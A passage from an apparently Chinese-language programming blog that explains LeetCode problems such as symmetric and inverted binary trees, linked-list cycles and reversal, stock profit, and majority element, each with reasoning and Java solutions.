8</span><br></pre></td></tr></table></figure><p>根据上面信息可以总结出递归函数的两个条件：<br>终止条件：</p><p>left 和 right 不等，或者 left 和 right 都为空<br>递归的比较 left，left 和 right.right，递归比较 left，right 和 right.left</p><p>递归方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//递归调用，比较左右节点</span></span><br><span class="line">        <span class="keyword">return</span> dfs(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(TreeNode left, TreeNode right)</span></span>&#123;</span><br><span class="line">        <span class="comment">//当两个节点都为空时终止</span></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="keyword">null</span> &amp;&amp; right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="keyword">null</span>  || right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left.val != right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//再递归比较 左节点的做孩子 和 右节点的右孩子 以及 左节点的右孩子 和 右节点的左孩子</span></span><br><span class="line">        <span class="keyword">return</span> dfs(left.left,right.right) &amp;&amp; dfs(left.right,right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-二叉树的最大深度"><a href="#7-二叉树的最大深度" class="headerlink" title="7.二叉树的最大深度"></a><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">7.二叉树的最大深度</a></h3><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><p><img src="/image/Hot100.assets/image-20230223134215018.png" alt="image-20230223134215018"></p><p>返回它的最大深度 3 。</p><p>思路：深度优先搜索(DFS)，如果知道了左子树和右子树的最大深度 <em>l</em> 和 <em>r</em>，则该二叉树的最大深度即为：<strong>max(<em>l</em>,<em>r</em>)+1</strong></p><p>而左子树和右子树的最大深度又可以以同样的方式进行计算。因此我们可以用「深度优先搜索」的方法来计算二叉树的最大深度。具体而言，在计算当前二叉树的最大深度时，可以先递归计算出其左子树和右子树的最大深度，然后在 O(1) 时间内计算出当前二叉树的最大深度。递归在访问到空节点时退出。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> left = maxDepth(root.left);</span><br><span class="line">                <span class="keyword">int</span> right = maxDepth(root.right);</span><br><span class="line">                <span class="keyword">return</span> Math.max(left,right) + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-买卖股票的最佳时机"><a href="#8-买卖股票的最佳时机" class="headerlink" title="8.买卖股票的最佳时机"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">8.买卖股票的最佳时机</a></h3><p>给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支给定股票第 i 天的价格。</p><p>你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来计算你所能获取的最大利润。</p><p>返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[7,1,5,3,6,4]</span><br><span class="line">输出：5</span><br><span class="line">解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span><br><span class="line">     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br></pre></td></tr></table></figure><p>思路：</p><p>一：暴力法，计算出每一种结果，找到最大的利润</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; prices.length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> profit = prices[j] - prices[i];</span><br><span class="line">                <span class="keyword">if</span> (profit &gt; maxprofit) &#123;</span><br><span class="line">                    maxprofit = profit;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度为：$O(n^2)$，会超出时间限制</p><p>二：动态规划</p><p>计算第 i 天的最大收益只需要知道前 i 天的最低点即可，而第 i 天以前（包括第 i 天）的最低点和 i-1 天的最低点有关。</p><p><code>dp[i] = min(dp[i-1], prices[i])</code></p><p>其中<code>dp[0] = prices[0]</code>，然后动态计算之后的就可以，得到了前 i 天的最低点后，只需要维护一个 max 来保存最大收益，时间复杂度为$O(n)$.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//dp[i]表示截止到第i天的价格最低点</span></span><br><span class="line">      <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">      dp[<span class="number">0</span>] = prices[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt; prices.length; i++)&#123;</span><br><span class="line">          dp[i] = (dp[i-<span class="number">1</span>] &lt; prices[i]) ? dp[i-<span class="number">1</span>] : prices[i];</span><br><span class="line">          max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-只出现一次的数字"><a href="#9-只出现一次的数字" class="headerlink" title="9.只出现一次的数字"></a><a href="https://leetcode.cn/problems/single-number/">9.只出现一次的数字</a></h3><p>给你一个 非空 整数数组 nums ，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>你必须设计并实现线性时间复杂度的算法来解决此问题，且该算法只使用常量额外空间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,2,1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p>思路：</p><p>只有一个元素出现了一次，所以将数组内的所有元素异或，最后剩下的元素即为只存在一次的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;nums.length;i++)&#123;</span><br><span class="line">            res ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈希表：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Integer i : nums) &#123;</span><br><span class="line">            Integer count = map.get(i);</span><br><span class="line">            count = count == <span class="keyword">null</span> ? <span class="number">1</span> : ++count;</span><br><span class="line">            map.put(i, count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Integer i : map.keySet()) &#123;</span><br><span class="line">            Integer count = map.get(i);</span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>; <span class="comment">// can&#x27;t find it.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-环形链表"><a href="#10-环形链表" class="headerlink" title="10.环形链表"></a><a href="https://leetcode.cn/problems/linked-list-cycle/">10.环形链表</a></h3><p>给你一个链表的头节点 head ，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环 ，则返回 true 。 否则，返回 false 。</p><p><img src="/image/Hot100.assets/circularlinkedlist.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure><p>思路：</p><p>一、哈希表：</p><p>遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</p><p>具体地，我们可以使用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Set&lt;ListNode&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!set.add(head))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Hot100.assets/image-20230224132619325.png" alt="image-20230224132619325"></p><p><strong>二、快慢指针</strong></p><p>本方法需要对「Floyd 判圈算法」（又称龟兔赛跑算法）有所了解。</p><p>假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。</p><p>注意：规定慢指针在<code>head</code>，快指针在<code>head.next</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       ListNode slow = head;</span><br><span class="line">       ListNode fast = head.next;</span><br><span class="line">       <span class="keyword">while</span>(slow != fast)&#123;</span><br><span class="line">           <span class="keyword">if</span>(fast == <span class="keyword">null</span> || fast.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           slow = slow.next;</span><br><span class="line">           fast = fast.next.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Hot100.assets/image-20230224135700576.png" alt="image-20230224135700576"></p><h3 id="11-相交链表"><a href="#11-相交链表" class="headerlink" title="11.相交链表"></a><a href="https://leetcode.cn/problems/intersection-of-two-linked-lists/">11.相交链表</a></h3><p>给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 null 。</p><p>图示两个链表在节点 c1 开始相交：</p><img src="/image/Hot100.assets/160_statement.png" alt="img" style="zoom: 80%;" /><p>题目数据 保证 整个链式结构中不存在环。</p><p>注意，函数返回结果后，链表必须 保持其原始结构 。</p><p>自定义评测：</p><p>评测系统 的输入如下（你设计的程序 不适用 此输入）：</p><ul><li><p>intersectVal - 相交的起始节点的值。如果不存在相交节点，这一值为 0</p></li><li><p>listA - 第一个链表</p></li><li><p>listB - 第二个链表</p></li><li><p>skipA - 在 listA 中（从头节点开始）跳到交叉节点的节点数</p></li><li><p>skipB - 在 listB 中（从头节点开始）跳到交叉节点的节点数</p></li></ul><p>评测系统将根据这些输入创建链式数据结构，并将两个头节点 headA 和 headB 传递给你的程序。如果程序能够正确返回相交节点，那么你的解决方案将被 视作正确答案 。</p><p>思路：</p><p>如果两个链表相交，那么相交点之后的长度是相同的</p><p>我们需要做的事情是，让两个链表从同距离末尾同等距离的位置开始遍历。这个位置只能是较短链表的头结点位置。<br>为此，我们必须消除两个链表的长度差</p><ul><li><p>指针 pA 指向 A 链表，指针 pB 指向 B 链表，依次往后遍历</p></li><li><p>如果 pA 到了末尾，则 pA = headB 继续遍历</p></li><li><p>如果 pB 到了末尾，则 pB = headA 继续遍历</p></li><li><p>比较长的链表指针指向较短链表head时，长度差就消除了</p></li><li><p>如此，只需要将最短链表遍历两次即可找到位置</p></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(headA == <span class="keyword">null</span> || headB == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode pA =headA, pB = headB;</span><br><span class="line">        <span class="keyword">while</span>(pA != pB)&#123;</span><br><span class="line">            pA = pA == <span class="keyword">null</span> ? headB : pA.next;</span><br><span class="line">            pB = pB == <span class="keyword">null</span> ? headA : pB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-多数元素"><a href="#12-多数元素" class="headerlink" title="12.多数元素"></a><a href="https://leetcode.cn/problems/majority-element/">12.多数元素</a></h3><p>给定一个大小为 n 的数组 nums ，返回其中的多数元素。多数元素是指在数组中出现次数 大于 ⌊ n/2 ⌋ 的元素。</p><p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,2,1,1,1,2,2]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><p>思路：</p><p>一、哈希表</p><p>计算出<strong>flag= ⌊ n/2 ⌋</strong>，使用哈希表，存放每个元素在数组中出现的次数，然后找出出现次数大于flag 的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> flag = nums.length / <span class="number">2</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(Integer i : nums) &#123;</span><br><span class="line">            Integer count = map.get(i);</span><br><span class="line">            count = count == <span class="keyword">null</span>  ? <span class="number">1</span> : ++count;</span><br><span class="line">            map.put(i,count);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Integer i : map.keySet())&#123;</span><br><span class="line">            Integer count = map.get(i);</span><br><span class="line">            <span class="keyword">if</span>(count &gt; flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二、排序</p><p>既然数组中有出现次数 &gt; ⌊ n/2 ⌋ 的元素，那排好序之后的数组中，相同元素总是相邻的。即存在长度 &gt; ⌊ n/2 ⌋ 的一长串 由 相同元素 构成的连续子数组，因此数组中间的元素总是“多数元素”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三、摩尔投票法</p><p>候选人(cand_num)初始化为 nums[0]，票数 count 初始化为 1。</p><p>当遇到与 cand_num 相同的数，则票数 count = count + 1，否则票数 count = count - 1。<br>当票数 count 为 0 时，更换候选人，并将票数 count 重置为 1。<br>遍历完数组后，cand_num 即为最终答案。</p><p>原理：</p><p>投票法是遇到相同的则 票数 + 1，遇到不同的则 票数 - 1。且“多数元素”的个数 &gt; ⌊ n/2 ⌋，其余元素的个数总和 &lt;= ⌊ n/2 ⌋。因此“多数元素”的个数 - 其余元素的个数总和 的结果 肯定 &gt;= 1。这就相当于每个 “多数元素” 和其他元素 两两相互抵消，抵消到最后肯定还剩余 至少1个 “多数元素”。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>], count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(res == nums[i])&#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (--count == <span class="number">0</span>)&#123;</span><br><span class="line">                res = nums[i];</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)。Boyer-Moore 算法只对数组进行了一次遍历。</p><p>空间复杂度：O(1)。Boyer-Moore 算法只需要常数级别的额外空间。</p><h3 id="13-反转链表"><a href="#13-反转链表" class="headerlink" title="13.反转链表"></a><a href="https://leetcode.cn/problems/reverse-linked-list/">13.反转链表</a></h3><img src="/image/Hot100.assets/image-20230226211314297.png" alt="image-20230226211314297" style="zoom:50%;" /><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><p>思路：双指针</p><img src="/image/Hot100.assets/9ce26a709147ad9ce6152d604efc1cc19a33dc5d467ed2aae5bc68463fdd2888.gif" alt="img" style="zoom: 67%;" /><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode cur = <span class="keyword">null</span>;</span><br><span class="line">        ListNode pre = head;</span><br><span class="line">        <span class="keyword">while</span>(pre !=<span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode tmp = pre.next;</span><br><span class="line">            pre.next = cur;</span><br><span class="line">            cur = pre;</span><br><span class="line">            pre = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-翻转二叉树"><a href="#14-翻转二叉树" class="headerlink" title="14.翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">14.翻转二叉树</a></h3><p>给你一棵二叉树的根节点 <code>root</code> ，翻转这棵二叉树，并返回其根节点。</p><img src="/image/Hot100.assets/invert1-tree.jpg" alt="img" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [4,2,7,1,3,6,9]</span><br><span class="line">输出：[4,7,2,9,6,3,1]</span><br></pre></td></tr></table></figure><p>思路：</p><p>一、递归</p><p>递归交换左右节点，当节点为null时返回</p><p>时间复杂度：每个元素都必须访问一次，所以是 O(n)<br>空间复杂度：最坏的情况下，需要存放 O(h) 个函数调用(h是树的高度)，所以是 O(h)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(root == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      TreeNode tmp = root.right;</span><br><span class="line">      root.right = root.left;</span><br><span class="line">      root.left = tmp;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//递归交换左右子树</span></span><br><span class="line">      invertTree(root.left);</span><br><span class="line">      <span class="comment">//递归交换右子树</span></span><br><span class="line">      invertTree(root.right);</span><br><span class="line">      <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二、迭代</p><p>使用广度优先遍历，首先将跟节点放入队列中，然后不断的迭代队列中的元素，对当前元素调换其左右子树的位置，然后进行判断</p><ul><li>若左子树不为空，则放入队列中</li><li>若右子树不为空，则放入队列中</li></ul><img src="/image/Hot100.assets/f9e06159617cbf8372b544daee37be70286c3d9b762c016664e225044fc4d479-226_迭代.gif" alt="226_迭代.gif" style="zoom:50%;" /><p>时间复杂度：同样每个节点都需要入队列/出队列一次，所以是 O(n)<br>空间复杂度：最坏的情况下会包含所有的叶子节点，完全二叉树叶子节点是 n/2个，所以时间复杂度是 0(n)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(root==<span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将二叉树中的节点逐层放入队列中，再迭代处理队列中的元素</span></span><br><span class="line">LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">queue.add(root);</span><br><span class="line"><span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line"><span class="comment">//每次都从队列中拿一个节点，并交换这个节点的左右子树</span></span><br><span class="line">TreeNode tmp = queue.poll();</span><br><span class="line">TreeNode left = tmp.left;</span><br><span class="line">tmp.left = tmp.right;</span><br><span class="line">tmp.right = left;</span><br><span class="line"><span class="comment">//如果当前节点的左子树不为空，则放入队列等待后续处理</span></span><br><span class="line"><span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) &#123;</span><br><span class="line">queue.add(tmp.left);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果当前节点的右子树不为空，则放入队列等待后续处理</span></span><br><span class="line"><span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) &#123;</span><br><span class="line">queue.add(tmp.right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回处理完的根节点</span></span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="15-回文链表"><a href="#15-回文链表" class="headerlink" title="15.回文链表"></a><a href="https://leetcode.cn/problems/palindrome-linked-list/">15.回文链表</a></h3><p>给你一个单链表的头节点 <code>head</code> ，请你判断该链表是否为回文链表。如果是，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p><img src="/image/Hot100.assets/pal1linked-list.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,2,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p>思路：</p><p>一、双指针</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow = head,fast = head;</span><br><span class="line">        ListNode pre = head, prepre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            pre = slow;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            pre.next = prepre;</span><br><span class="line">            prepre = pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast != <span class="keyword">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pre != <span class="keyword">null</span> &amp;&amp; slow != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre.val != slow.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二、将值复制到数组中后用双指针法</p><ol><li>复制链表值到数组列表中。</li><li>使用双指针法判断是否为回文。</li></ol><p>第一步，我们需要遍历链表将值复制到数组列表中。我们用 currentNode 指向当前节点。每次迭代向数组添加 currentNode.val，并更新 